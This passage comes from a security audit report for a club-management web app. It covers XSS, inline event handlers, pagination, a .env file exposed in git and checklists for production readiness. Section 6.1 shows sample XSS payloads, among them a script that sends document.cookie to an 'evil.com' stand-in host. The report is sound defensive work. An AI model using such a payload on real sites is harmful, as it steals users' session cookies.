ALTER TABLE members ADD COLUMN deleted_at TIMESTAMPTZ;

-- Change ON DELETE CASCADE to ON DELETE RESTRICT
-- Use soft delete instead:
UPDATE competitions SET deleted_at = NOW() WHERE id = X;

-- Filter out deleted records in queries
WHERE deleted_at IS NULL
```

---

## 6. FRONTEND VULNERABILITIES

### 6.1 XSS in Member Display
**Severity:** HIGH
**Files:** `admin/admin-script.js`, other HTML rendering

**Issue:**
```javascript
row.innerHTML = `
    <td><strong>${reg.name}</strong></td>  // Unescaped user input!
    <td>${reg.email}</td>
`;
```

**Attack:**
```javascript
// Attacker registers with name:
name: '<img src=x onerror="alert(document.cookie)">'

// Or worse:
name: '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>'
```

**Fix Required:**
```javascript
// HTML escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Use it:
row.innerHTML = `
    <td><strong>${escapeHtml(reg.name)}</strong></td>
    <td>${escapeHtml(reg.email)}</td>
`;

// Or use textContent for text-only:
td.textContent = reg.name;  // Automatically escaped
```

### 6.2 Inline Event Handlers
**Severity:** MEDIUM
**Files:** `admin/admin-script.js` (Line 169-171)

**Issue:**
```javascript
row.innerHTML = `
    // ...
    <td>
        <button class="btn-small" onclick="editRegistration(${reg.id})">
        <button class="btn-small" onclick="deleteRegistration(${reg.id})">
    </td>
`;
```

**Problems:**
1. Violates Content Security Policy
2. Not compatible with nonce-based CSP
3. Makes XSS easier if reg.id is ever user-controlled

**Fix Required:**
```javascript
// Create element without innerHTML
const editBtn = document.createElement('button');
editBtn.className = 'btn-small';
editBtn.innerHTML = '<i class="fas fa-edit"></i>';
editBtn.addEventListener('click', () => editRegistration(reg.id));

const deleteBtn = document.createElement('button');
deleteBtn.className = 'btn-small';
deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
deleteBtn.addEventListener('click', () => deleteRegistration(reg.id));

const td = document.createElement('td');
td.appendChild(editBtn);
td.appendChild(deleteBtn);
row.appendChild(td);
```

### 6.3 No CORS Preflight Caching
**Severity:** LOW
**File:** `server/api-supabase.js`

**Issue:** No Access-Control-Max-Age header

**Impact:** Browser makes OPTIONS request before every API call

**Fix:**
```javascript
app.use(cors({
    // ... existing config
    maxAge: 86400,  // Cache preflight for 24 hours
}));
```

---

## 7. PERFORMANCE ISSUES

### 7.1 No Database Indexes on Foreign Keys
**Severity:** MEDIUM
**File:** `database/schema.sql`

**Issue:** Some foreign keys don't have indexes

**Example:**
```sql
-- registrations table
member_id BIGINT NOT NULL REFERENCES members(id)
-- Index created: ✓ Line 157

-- permits table
member_id BIGINT REFERENCES members(id) ON DELETE SET NULL
-- Index created: ✓ Line 168
```

**Actually, indexes ARE created! Good job. But verify with:**
```sql
SELECT tablename, indexname, indexdef
FROM pg_indexes
WHERE schemaname = 'public'
ORDER BY tablename, indexname;
```

### 7.2 N+1 Query Problem
**Severity:** MEDIUM
**File:** `server/api-supabase.js` (Lines 606-640)

**Issue:**
```javascript
app.get('/api/registrations', authenticateToken, async (req, res) => {
    const { data, error } = await supabase
        .from('registrations')
        .select(`
            *,
            members (name, member_number),
            competitions (name, date)
        `)
```

**Good!** Using Supabase's `select()` with joins avoids N+1 queries. This is correct.

**But check:** Are there other endpoints that load relations one-by-one?

### 7.3 Missing Pagination
**Severity:** MEDIUM
**Files:** All GET endpoints

**Issue:** No pagination on list endpoints

**Example:**
```javascript
app.get('/api/members', authenticateToken, async (req, res) => {
    const { data, error } = await supabase
        .from('members')
        .select('*')  // Could return 1000+ members!
```

**Fix Required:**
```javascript
app.get('/api/members', authenticateToken, async (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const offset = (page - 1) * limit;

    // Validate limits
    if (limit > 100) {
        return res.status(400).json({ error: 'Limit cannot exceed 100' });
    }

    const { data, error, count } = await supabase
        .from('members')
        .select('*', { count: 'exact' })
        .range(offset, offset + limit - 1)
        .order('member_number', { ascending: true });

    if (error) throw error;

    res.json({
        data,
        pagination: {
            page,
            limit,
            total: count,
            totalPages: Math.ceil(count / limit)
        }
    });
});
```

---

## 8. CONFIGURATION ISSUES

### 8.1 .env File in Git History
**Severity:** CRITICAL
**File:** `.env` (Line in git status)

**Issue:** The git status shows `.env` as modified:
```
-rw-r--r-- 1 kevin 197609   556 Nov  1 01:57 .env
```

**DANGER:** Check git history:
```bash
git log --all --full-history -- .env
```

If .env was EVER committed, the secrets are PERMANENTLY in git history!

**Fix Required:**
```bash
# Check if in history
git log --all --full-history -- .env

# If found, remove from history (DANGEROUS - rewrites history)
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all

# Then force push (breaks all clones)
git push origin --force --all
git push origin --force --tags

# Better: Rotate ALL secrets immediately
# - Generate new JWT_SECRET
# - Rotate Supabase keys
# - Change all admin passwords
```

### 8.2 Hardcoded API URL
**Severity:** MEDIUM
**File:** `admin/admin-auth.js` (Line 21)

**Issue:**
```javascript
this.API_BASE_URL = 'https://jouw-app.up.railway.app/api';
// ☝️ WIJZIG DIT NAAR JE RAILWAY URL!
```

**Problem:** Hardcoded placeholder URL

**Fix:** Use environment variable or config:
```javascript
this.API_BASE_URL = window.APP_CONFIG.API_BASE_URL;
```

---

## 9. TEST RESULTS

### 9.1 Manual Testing Checklist

#### Authentication Tests:
- [ ] Login with valid credentials
- [ ] Login with invalid credentials
- [ ] Login with expired token
- [ ] Login rate limiting (5 attempts)
- [ ] Logout functionality
- [ ] Token refresh mechanism (NOT IMPLEMENTED)
- [ ] Access protected route without token
- [ ] Access protected route with invalid token

#### CRUD Operations Tests:
- [ ] Create member with valid data
- [ ] Create member with invalid email
- [ ] Create member with duplicate member_number
- [ ] Update member
- [ ] Delete member (with cascade checks)
- [ ] Similar tests for competitions, results, registrations

#### Database Tests:
- [ ] RLS policies block anonymous access to private tables
- [ ] RLS policies allow service role full access
- [ ] Views respect RLS policies
- [ ] Triggers update updated_at correctly
- [ ] Constraints prevent invalid data
- [ ] Cascade deletes work correctly

#### Security Tests:
- [ ] XSS attempt in name field
- [ ] SQL injection attempt in username
- [ ] CSRF attack attempt
- [ ] Large payload attack (>10MB)
- [ ] Rate limit bypass attempt
- [ ] Token manipulation attempt

### 9.2 Automated Test Coverage
**Status:** 0% - NO TESTS EXIST

**Required Tests:**
1. Unit tests for all API endpoints
2. Integration tests for database operations
3. E2E tests for critical user flows
4. Security tests (penetration testing)
5. Performance tests (load testing)

---

## 10. PRODUCTION READINESS CHECKLIST

### CRITICAL (MUST FIX BEFORE LAUNCH):
- [ ] **FIX:** Remove express-rate-limit import or install package
- [ ] **FIX:** Resolve USE_LOCAL_MODE configuration conflicts
- [ ] **FIX:** Remove hardcoded credentials from login.html
- [ ] **FIX:** Add input validation to all API endpoints
- [ ] **FIX:** Implement HTTPS enforcement
- [ ] **FIX:** Add CSRF protection
- [ ] **FIX:** Fix JWT_SECRET validation to include .env.example value
- [ ] **FIX:** Validate all environment variables on startup
- [ ] **TEST:** Verify .env file never committed to git (rotate secrets if so)

### HIGH PRIORITY (FIX WITHIN 1 WEEK):
- [ ] Implement password complexity requirements
- [ ] Reduce request body size limit to 100kb
- [ ] Implement proper logging with Winston
- [ ] Add account lockout after failed login attempts
- [ ] Add input length validation
- [ ] Implement email verification
- [ ] Create password reset functionality
- [ ] Add API versioning
- [ ] Fix error handling to not expose stack traces
- [ ] Implement database backup strategy
- [ ] Add monitoring and alerting
- [ ] Implement short-lived JWT tokens with refresh tokens

### MEDIUM PRIORITY (FIX WITHIN 1 MONTH):
- [ ] Fix error handling in DataAPI
- [ ] Migrate offline queue to IndexedDB
- [ ] Add Content Security Policy headers
- [ ] Standardize date handling across codebase
- [ ] Implement frontend build process (Vite)
- [ ] Optimize ranking views with materialized views
- [ ] Create API documentation (OpenAPI/Swagger)

### LOW PRIORITY (NICE TO HAVE):
- [ ] Remove console.log from production code
- [ ] Complete or remove TODO comments
- [ ] Audit and remove unused dependencies
- [ ] Consider TypeScript migration
- [ ] Implement E2E tests

---

## 11. DEPLOYMENT BLOCKERS

### Cannot Deploy Until Fixed:
1. **Missing Package:** `npm install express-rate-limit`
2. **Configuration:** Fix USE_LOCAL_MODE conflicts
3. **Security:** Remove hardcoded credentials
4. **Validation:** Add input validation to prevent XSS/injection
5. **Environment:** Verify all required env vars are set
6. **Testing:** Test authentication flow works with backend

### Deployment Steps (After Fixes):
1. Set all environment variables in hosting platform
2. Run database migrations (schema.sql, rls-policies.sql)
3. Create initial admin user with strong password
4. Test all critical paths
5. Enable HTTPS (required!)
6. Configure monitoring
7. Deploy
8. Verify health check endpoint
9. Test login and key features
10. Monitor logs for errors

---

## 12. PRIORITY ACTION ITEMS

### TOP 5 FIXES BEFORE GOING LIVE:

1. **Fix Missing Rate Limiting Package (5 minutes)**
   ```bash
   npm install express-rate-limit
   npm install helmet
   npm install winston
   ```

2. **Remove Configuration Conflicts (15 minutes)**
   - Delete `USE_LOCAL_MODE` from `admin/admin-auth.js`
   - Always use `window.APP_CONFIG.USE_LOCAL_MODE`
   - Set to `false` in production

3. **Secure Login Page (30 minutes)**
   - Remove hardcoded credentials from `login.html`
   - Force backend authentication
   - Add rate limiting per username

4. **Add Input Validation (2 hours)**
   - Install `express-validator`
   - Add validation middleware to all POST/PUT endpoints
   - Implement HTML escaping in frontend

5. **Test Complete Authentication Flow (1 hour)**
   - Test login with real backend
   - Test token expiration
   - Test protected routes
   - Verify rate limiting works

---

## 13. CONCLUSION

### Overall Assessment:
The Visclub SiM application has a **solid foundation** with good architectural choices (Supabase, JWT, RLS policies), but has **critical security vulnerabilities** that must be fixed before production deployment.

### Strengths:
- ✅ Well-structured database schema with proper indexes
- ✅ Row Level Security policies implemented
- ✅ JWT authentication framework in place
- ✅ Good separation of concerns (frontend/backend)
- ✅ Environment variable usage (mostly correct)
- ✅ CORS configuration (mostly correct)

### Weaknesses:
- ❌ Configuration conflicts (local vs backend mode)
- ❌ Missing critical dependencies
- ❌ No input validation
- ❌ Hardcoded credentials exposed
- ❌ Incomplete error handling
- ❌ No testing coverage
- ❌ Security headers missing

### Recommendation:
**DO NOT DEPLOY TO PRODUCTION** until at least the TOP 5 CRITICAL ISSUES are fixed.

With 2-3 days of focused security work, this application can be production-ready. The core architecture is sound, but security hardening is essential.

### Estimated Time to Production Ready:
- **Critical fixes:** 4-6 hours
- **High priority fixes:** 1-2 days
- **Testing:** 1 day
- **Total:** 3-4 days of work

---

## 14. CONTACT FOR QUESTIONS

For questions about this audit, contact the development team or security consultant.

**Next Steps:**
1. Review this report with the team
2. Prioritize fixes based on severity
3. Create GitHub issues for each item
4. Assign developers to fixes
5. Re-test after fixes
6. Schedule security review before launch

---

**End of Security Audit Report**
